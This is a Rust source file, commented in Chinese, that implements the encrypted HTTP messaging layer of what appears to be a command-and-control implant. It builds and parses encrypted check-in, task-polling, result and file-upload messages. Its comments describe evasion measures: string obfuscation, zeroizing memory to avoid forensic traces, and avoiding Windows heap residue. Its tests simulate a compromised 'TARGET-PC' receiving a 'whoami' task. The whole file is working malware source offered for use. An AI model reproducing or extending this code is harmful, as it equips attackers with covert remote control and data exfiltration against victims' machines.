use crate::profiles::crypto::{zeroize_slice, CryptoContext, CryptoError, MAX_PLAINTEXT_LEN};
pub use crate::profiles::crypto::{MAX_B64_LEN, MAX_RAW_LEN};
use crate::profiles::models::{
    CheckinMessage, FileChunkPayload, GetTaskingMessage, PostResponseMessage,
    ServerCheckinResponse, ServerTaskingResponse, ServerTaskingResponseRef,
};
use crate::obfstr;

// #![allow(unused)]

/// Profile 网络通信层错误代号
/// 
/// 遵循单字节 `u8` 判别值布局 (`#[repr(u8)]`)，实现内存极限压缩与嵌入式/no_std 环境下的轻量错误传递。
#[repr(u8)]
#[derive(PartialEq, Eq, Clone, Copy)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub enum HttpError {
    /// Crypto 加密封包阶段失败 (包装底层的 CryptoError)
    CryptoSealFailed(CryptoError) = 1,
    /// Crypto 解包解密阶段失败 (包装底层的 CryptoError)
    CryptoOpenFailed(CryptoError) = 2,
    /// JSON 序列化失败 (如结构体字段异常或 buffer 越界)
    JsonSerializeFailed = 3,
    /// JSON 反序列化失败 (如 C2 响应 JSON 结构损坏)
    JsonDeserializeFailed = 4,
    /// 网络请求或传输底层错误
    NetworkTransportFailed = 5,
    /// C2 服务端返回状态非 "success" (如 "error" 状态)
    ServerResponseError = 6,
    /// 缓冲区容量不足以容纳 JSON 载荷
    BufferOverflow = 7,
}

impl HttpError {
    /// 获取错误的单字节错误码，便于底层汇编/汇聚处理
    #[inline(always)]
    pub const fn code(self) -> u8 {
        match self {
            HttpError::CryptoSealFailed(e) => e.code(),
            HttpError::CryptoOpenFailed(e) => e.code(),
            HttpError::JsonSerializeFailed => 3,
            HttpError::JsonDeserializeFailed => 4,
            HttpError::NetworkTransportFailed => 5,
            HttpError::ServerResponseError => 6,
            HttpError::BufferOverflow => 7,
        }
    }
}

/// HTTP Profile 协议打包与网络传输协议管理器
///
/// 遵循 `crypto.rs` 的 Caller-Provided Buffer 零内存分配设计哲学。
/// 所有打包解包操作均在调用者提供的外部栈/静态缓冲区中原地（In-Place）运行，
/// 并确保在中途失败或正常完成时自动清理堆/栈中间明文碎片。
pub struct HttpProfile<'a> {
    /// C2 服务器地址或域名 (如 "http://127.0.0.1:8080")
    pub server_url: &'a str,
    /// HTTP POST 请求 URI 路径 (如 "/api/v1/post")
    pub post_uri: &'a str,
    /// Agent 唯一标识符 UUID (36 字节)
    pub uuid: &'a str,
    /// 密码学上下文管理器 (复用主/子密钥派生)
    pub crypto_ctx: &'a CryptoContext,
}

impl<'a> HttpProfile<'a> {
    /// 创建一个新的 HttpProfile 实例
    #[inline]
    pub fn new(
        server_url: &'a str,
        post_uri: &'a str,
        uuid: &'a str,
        crypto_ctx: &'a CryptoContext,
    ) -> Self {
        Self {
            server_url,
            post_uri,
            uuid,
            crypto_ctx,
        }
    }

    /// 纯字节切片直接封包加密 (零堆分配管道)
    ///
    /// * `data`: 待加密发送的原始明文切片 (不得超过 MAX_PLAINTEXT_LEN, 即 2960 字节)
    /// * `raw_buf`: caller 提供的二进制字节缓冲区 (建议 `>= MAX_RAW_LEN` 即 3072)
    /// * `out_b64`: caller 提供的 Base64 输出缓冲区 (建议 `>= MAX_B64_LEN` 即 4096)
    /// * 返回: 写入 `out_b64` 的实际 Base64 字节长度
    #[inline(never)]
    pub fn pack_bytes(
        &self,
        data: &[u8],
        raw_buf: &mut [u8],
        out_b64: &mut [u8],
    ) -> Result<usize, HttpError> {
        if data.len() > MAX_PLAINTEXT_LEN {
            return Err(HttpError::BufferOverflow);
        }
        self.crypto_ctx
            .seal_message(data, self.uuid, raw_buf, out_b64)
            .map_err(HttpError::CryptoSealFailed)
    }

    /// 将结构体序列化 JSON -> AES-CBC-HMAC 加密 -> Base64 编码
    ///
    /// * `message`: 实现了 `Serialize` 的消息结构体 (如 `CheckinMessage` / `GetTaskingMessage`)
    /// * `raw_buf`: caller 提供的二进制字节缓冲区 (建议 `>= MAX_RAW_LEN` 即 3072)
    /// * `out_b64`: caller 提供的 Base64 文本输出缓冲区 (建议 `>= MAX_B64_LEN` 即 4096)
    /// * 返回: 写入 `out_b64` 的实际 Base64 字节长度
    ///
    /// # 内存安全与隐蔽性保证
    /// 序列化生成的中间明文 JSON 字节存放在 `alloc::vec::Vec` 中，发送完成或遇到任何异常退出时，
    /// 均显式调用 `zeroize_slice` 洗白该 Vector 内存，防止堆内存碎片泄露 C2 数据。
    #[inline(never)]
    pub fn pack_message<T: serde::Serialize>(
        &self,
        message: &T,
        raw_buf: &mut [u8],
        out_b64: &mut [u8],
    ) -> Result<usize, HttpError> {
        // 1. 预分配 MAX_PLAINTEXT_LEN 容量 Vec，规避 Segment Heap 频繁重分配 (Reallocate) 抖动
        let mut json_bytes = alloc::vec::Vec::with_capacity(MAX_PLAINTEXT_LEN);
        let mut serializer = serde_json::Serializer::new(&mut json_bytes);
        message
            .serialize(&mut serializer)
            .map_err(|_| HttpError::JsonSerializeFailed)?;

        struct AutoZeroize(alloc::vec::Vec<u8>);
        impl core::ops::Deref for AutoZeroize {
            type Target = [u8];
            #[inline(always)]
            fn deref(&self) -> &[u8] {
                &self.0
            }
        }
        impl Drop for AutoZeroize {
            fn drop(&mut self) {
                zeroize_slice(&mut self.0);
            }
        }

        let json_guard = AutoZeroize(json_bytes);
        if json_guard.len() > MAX_PLAINTEXT_LEN {
            return Err(HttpError::BufferOverflow);
        }

        // 2. 调用纯切片封包管线
        self.pack_bytes(&json_guard, raw_buf, out_b64)
    }

    /// 纯密文解包解密为明文切片 (In-place 单缓冲区解密，零堆分配)
    ///
    /// * `payload_b64`: 服务端返回的 Base64 密文切片
    /// * `raw_buf`: caller 提供的工作缓冲区
    /// * 返回: 指向 `raw_buf` 前段有效明文区域的切片引用 `&[u8]`
    #[inline(never)]
    pub fn unpack_bytes<'b>(
        &self,
        payload_b64: &[u8],
        raw_buf: &'b mut [u8],
    ) -> Result<&'b [u8], HttpError> {
        // 剥离尾部 ASCII 换行符与空白字符 (\r, \n, 空格)，增强网络容错率
        let clean_payload = payload_b64
            .iter()
            .rposition(|&b| !b.is_ascii_whitespace())
            .map(|pos| &payload_b64[..=pos])
            .unwrap_or(payload_b64);

        let pt_len = self
            .crypto_ctx
            .open_message(clean_payload, raw_buf)
            .map_err(HttpError::CryptoOpenFailed)?;
        Ok(&raw_buf[..pt_len])
    }

    /// 将服务端返回的 Base64 密文 -> 校验并解密 -> 反序列化为目标结构体 T
    ///
    /// * `payload_b64`: 服务端返回的 Base64 响应数据切片
    /// * `raw_buf`: caller 提供的工作缓冲区 (解密明文在 `raw_buf[..pt_len]`)
    /// * 返回: 反序列化后的结构体 T
    ///
    /// # 内存安全与隐蔽性保证
    /// 解密后反序列化工作在 `raw_buf` 切片上直接完成。对于返回的零拷贝借用类型（'de），
    /// 调用者在使用完毕后应主动调用 `zeroize_slice` 洗白该缓冲区。
    #[inline(never)]
    pub fn unpack_message<'de, T: serde::Deserialize<'de>>(
        &self,
        payload_b64: &[u8],
        raw_buf: &'de mut [u8],
    ) -> Result<T, HttpError> {
        let slice = self.unpack_bytes(payload_b64, raw_buf)?;
        serde_json::from_slice(slice).map_err(|_| HttpError::JsonDeserializeFailed)
    }

    /// 构建 Checkin 上线请求 Base64 报文
    #[inline(never)]
    pub fn build_checkin_payload(
        &self,
        checkin_msg: &CheckinMessage,
        raw_buf: &mut [u8],
        out_b64: &mut [u8],
    ) -> Result<usize, HttpError> {
        self.pack_message(checkin_msg, raw_buf, out_b64)
    }

    /// 解析 Checkin 响应报文并自动验证 status
    ///
    /// 返回零拷贝切片借用的 `ServerCheckinResponse<'de>`，杜绝在 Windows 堆上的动态分配。
    #[inline(never)]
    pub fn parse_checkin_response<'de>(
        &self,
        payload_b64: &[u8],
        raw_buf: &'de mut [u8],
    ) -> Result<ServerCheckinResponse<'de>, HttpError> {
        let resp: ServerCheckinResponse<'de> = self.unpack_message(payload_b64, raw_buf)?;
        if resp.status != obfstr!("success") {
            return Err(HttpError::ServerResponseError);
        }
        Ok(resp)
    }

    /// 构建 GetTasking 任务轮询请求 Base64 报文
    #[inline(never)]
    pub fn build_get_tasking_payload(
        &self,
        tasking_msg: &GetTaskingMessage,
        raw_buf: &mut [u8],
        out_b64: &mut [u8],
    ) -> Result<usize, HttpError> {
        self.pack_message(tasking_msg, raw_buf, out_b64)
    }

    /// 解析 GetTasking 任务响应报文 (拥有所有权版)
    #[inline(never)]
    pub fn parse_get_tasking_response(
        &self,
        payload_b64: &[u8],
        raw_buf: &mut [u8],
    ) -> Result<ServerTaskingResponse, HttpError> {
        let resp: ServerTaskingResponse = self.unpack_message(payload_b64, raw_buf)?;
        if resp.status != obfstr!("success") {
            return Err(HttpError::ServerResponseError);
        }
        Ok(resp)
    }

    /// 解析 GetTasking 任务响应报文 (零拷贝借用切片版)
    ///
    /// 直接借用 `raw_buf` 明文切片，字符串零堆分配，规避 Windows 10/11 Segment Heap 堆抖动与残留。
    #[inline(never)]
    pub fn parse_get_tasking_response_ref<'de>(
        &self,
        payload_b64: &[u8],
        raw_buf: &'de mut [u8],
    ) -> Result<ServerTaskingResponseRef<'de>, HttpError> {
        let resp: ServerTaskingResponseRef<'de> = self.unpack_message(payload_b64, raw_buf)?;
        if resp.status != obfstr!("success") {
            return Err(HttpError::ServerResponseError);
        }
        Ok(resp)
    }

    /// 构建 PostResponse 任务回执请求 Base64 报文
    #[inline(never)]
    pub fn build_post_response_payload(
        &self,
        response_msg: &PostResponseMessage<'_>,
        raw_buf: &mut [u8],
        out_b64: &mut [u8],
    ) -> Result<usize, HttpError> {
        self.pack_message(response_msg, raw_buf, out_b64)
    }

    /// 构建大文件分片传输请求 Base64 报文 (零堆分配)
    #[inline(never)]
    pub fn build_file_chunk_payload(
        &self,
        chunk: &FileChunkPayload<'_>,
        raw_buf: &mut [u8],
        out_b64: &mut [u8],
    ) -> Result<usize, HttpError> {
        self.pack_message(chunk, raw_buf, out_b64)
    }
}

// ==========================================
// 单元测试模块
// ==========================================

#[cfg(test)]
mod tests {
    use super::*;
    use crate::profiles::crypto::{MAX_B64_LEN, MAX_RAW_LEN};
    use crate::profiles::models::TaskResponseItem;

    #[test]
    fn test_http_profile_checkin_roundtrip() {
        let master_key = b"01234567890123456789012345678901";
        let uuid = "12345678-1234-1234-1234-1234567890ab";
        let crypto_ctx = CryptoContext::new(master_key).unwrap();

        let profile = HttpProfile::new("http://127.0.0.1:8080", "/api/v1/post", uuid, &crypto_ctx);

        let checkin_msg = CheckinMessage::new(
            uuid,
            "192.168.1.50",
            "Windows 11",
            "Administrator",
            "TARGET-PC",
            4321,
            "x64",
            "WORKGROUP",
        );

        let mut raw_buf = [0u8; MAX_RAW_LEN];
        let mut b64_buf = [0u8; MAX_B64_LEN];

        // 打包加密
        let b64_len = profile
            .build_checkin_payload(&checkin_msg, &mut raw_buf, &mut b64_buf)
            .unwrap();
        assert!(b64_len > 0);

        // 模拟服务端准备解密并验证原结构
        let mut server_raw_buf = [0u8; MAX_RAW_LEN];
        let unpacked: CheckinMessage = profile
            .unpack_message(&b64_buf[..b64_len], &mut server_raw_buf)
            .unwrap();

        assert_eq!(unpacked.action, "checkin");
        assert_eq!(unpacked.ip, "192.168.1.50");
        assert_eq!(unpacked.uuid, uuid);
    }

    #[test]
    fn test_http_profile_tasking_roundtrip() {
        let master_key = b"01234567890123456789012345678901";
        let uuid = "12345678-1234-1234-1234-1234567890ab";
        let crypto_ctx = CryptoContext::new(master_key).unwrap();

        let profile = HttpProfile::new("http://127.0.0.1:8080", "/index.php", uuid, &crypto_ctx);

        let tasking_msg = GetTaskingMessage::default();
        let mut raw_buf = [0u8; MAX_RAW_LEN];
        let mut b64_buf = [0u8; MAX_B64_LEN];

        let b64_len = profile
            .build_get_tasking_payload(&tasking_msg, &mut raw_buf, &mut b64_buf)
            .unwrap();

        let mut server_raw_buf = [0u8; MAX_RAW_LEN];
        let unpacked: GetTaskingMessage = profile
            .unpack_message(&b64_buf[..b64_len], &mut server_raw_buf)
            .unwrap();

        assert_eq!(unpacked.action, "get_tasking");
        assert_eq!(unpacked.tasking_size, 1);
    }

    #[test]
    fn test_http_profile_post_response_roundtrip() {
        let master_key = b"01234567890123456789012345678901";
        let uuid = "12345678-1234-1234-1234-1234567890ab";
        let crypto_ctx = CryptoContext::new(master_key).unwrap();

        let profile = HttpProfile::new("http://127.0.0.1:8080", "/api/v1/post", uuid, &crypto_ctx);

        // 调用者栈帧上分配的固定数组，直接切片借用，零堆分配
        let item = TaskResponseItem::new("task-uuid-123", "desktop-user", true);
        let items = [item];
        let resp_msg = PostResponseMessage::new(&items);

        let mut raw_buf = [0u8; MAX_RAW_LEN];
        let mut b64_buf = [0u8; MAX_B64_LEN];

        let b64_len = profile
            .build_post_response_payload(&resp_msg, &mut raw_buf, &mut b64_buf)
            .unwrap();

        // 模拟服务端接收并解析反序列化为通用 JSON Value 验证字段内容
        let mut server_raw_buf = [0u8; MAX_RAW_LEN];
        let unpacked: serde_json::Value = profile
            .unpack_message(&b64_buf[..b64_len], &mut server_raw_buf)
            .unwrap();

        assert_eq!(unpacked["action"], "post_response");
        assert_eq!(unpacked["responses"].as_array().unwrap().len(), 1);
        assert_eq!(unpacked["responses"][0]["task_id"], "task-uuid-123");
        assert_eq!(unpacked["responses"][0]["user_output"], "desktop-user");
        assert_eq!(unpacked["responses"][0]["completed"], true);
    }

    #[test]
    fn test_http_profile_parse_checkin_response_roundtrip() {
        let master_key = b"01234567890123456789012345678901";
        let uuid = "12345678-1234-1234-1234-1234567890ab";
        let crypto_ctx = CryptoContext::new(master_key).unwrap();

        let profile = HttpProfile::new("http://127.0.0.1:8080", "/api/v1/post", uuid, &crypto_ctx);

        let checkin_resp = ServerCheckinResponse::new("checkin", "success", Some("87654321-4321-4321-4321-ba0987654321"));

        let mut raw_buf = [0u8; MAX_RAW_LEN];
        let mut b64_buf = [0u8; MAX_B64_LEN];

        // 模拟服务端将响应封包
        let b64_len = profile
            .pack_message(&checkin_resp, &mut raw_buf, &mut b64_buf)
            .unwrap();

        // 客户端接收并零拷贝解析响应
        let mut client_raw_buf = [0u8; MAX_RAW_LEN];
        let parsed = profile
            .parse_checkin_response(&b64_buf[..b64_len], &mut client_raw_buf)
            .unwrap();

        assert_eq!(parsed.action, "checkin");
        assert_eq!(parsed.status, "success");
        assert_eq!(parsed.id, Some("87654321-4321-4321-4321-ba0987654321"));

        // 将新的 Callback UUID 安全拷贝入持久化栈/静态缓冲区中
        let mut session_uuid = [0u8; 36];
        assert_eq!(parsed.copy_id_to(&mut session_uuid), Ok(true));
        assert_eq!(&session_uuid, b"87654321-4321-4321-4321-ba0987654321");

        // 业务完成后安全物理清空客户端工作缓冲区
        zeroize_slice(&mut client_raw_buf);
    }

    #[test]
    fn test_http_profile_pack_bytes_and_unpack_bytes() {
        let master_key = b"01234567890123456789012345678901";
        let uuid = "12345678-1234-1234-1234-1234567890ab";
        let crypto_ctx = CryptoContext::new(master_key).unwrap();
        let profile = HttpProfile::new("http://127.0.0.1:8080", "/data", uuid, &crypto_ctx);

        let original_data = b"raw_binary_stream_data_zero_alloc";
        let mut raw_buf = [0u8; MAX_RAW_LEN];
        let mut b64_buf = [0u8; MAX_B64_LEN];

        let b64_len = profile
            .pack_bytes(original_data, &mut raw_buf, &mut b64_buf)
            .unwrap();
        assert!(b64_len > 0);

        let mut recv_buf = [0u8; MAX_RAW_LEN];
        let decrypted = profile
            .unpack_bytes(&b64_buf[..b64_len], &mut recv_buf)
            .unwrap();
        assert_eq!(decrypted, original_data);
    }

    #[test]
    fn test_http_profile_parse_tasking_response_ref_roundtrip() {
        let master_key = b"01234567890123456789012345678901";
        let uuid = "12345678-1234-1234-1234-1234567890ab";
        let crypto_ctx = CryptoContext::new(master_key).unwrap();
        let profile = HttpProfile::new("http://127.0.0.1:8080", "/get_tasking", uuid, &crypto_ctx);

        let json_payload = br#"{"action":"get_tasking","status":"success","tasks":[{"id":"t-1","command":"whoami","parameters":""}]}"#;
        let mut raw_buf = [0u8; MAX_RAW_LEN];
        let mut b64_buf = [0u8; MAX_B64_LEN];

        let b64_len = profile
            .pack_bytes(json_payload, &mut raw_buf, &mut b64_buf)
            .unwrap();

        let mut client_raw_buf = [0u8; MAX_RAW_LEN];
        let parsed = profile
            .parse_get_tasking_response_ref(&b64_buf[..b64_len], &mut client_raw_buf)
            .unwrap();

        assert_eq!(parsed.action, "get_tasking");
        assert_eq!(parsed.status, "success");
        assert_eq!(parsed.tasks.len(), 1);
        assert_eq!(parsed.tasks[0].id, "t-1");
        assert_eq!(parsed.tasks[0].command, "whoami");
    }

    #[test]
    fn test_http_profile_build_file_chunk_payload_roundtrip() {
        let master_key = b"01234567890123456789012345678901";
        let uuid = "12345678-1234-1234-1234-1234567890ab";
        let crypto_ctx = CryptoContext::new(master_key).unwrap();
        let profile = HttpProfile::new("http://127.0.0.1:8080", "/upload", uuid, &crypto_ctx);

        let chunk = FileChunkPayload::new(
            "upload",
            "task-upload-002",
            "file-uuid-002",
            2,
            10,
            "CHUNK_DATA_BASE64_XYZ",
        );

        let mut raw_buf = [0u8; MAX_RAW_LEN];
        let mut b64_buf = [0u8; MAX_B64_LEN];

        let b64_len = profile
            .build_file_chunk_payload(&chunk, &mut raw_buf, &mut b64_buf)
            .unwrap();
        assert!(b64_len > 0);

        let mut client_raw_buf = [0u8; MAX_RAW_LEN];
        let unpacked: FileChunkPayload = profile
            .unpack_message(&b64_buf[..b64_len], &mut client_raw_buf)
            .unwrap();
        assert_eq!(unpacked.action, "upload");
        assert_eq!(unpacked.chunk_num, 2);
        assert_eq!(unpacked.total_chunks, 10);
        assert_eq!(unpacked.chunk_data, "CHUNK_DATA_BASE64_XYZ");
    }
}
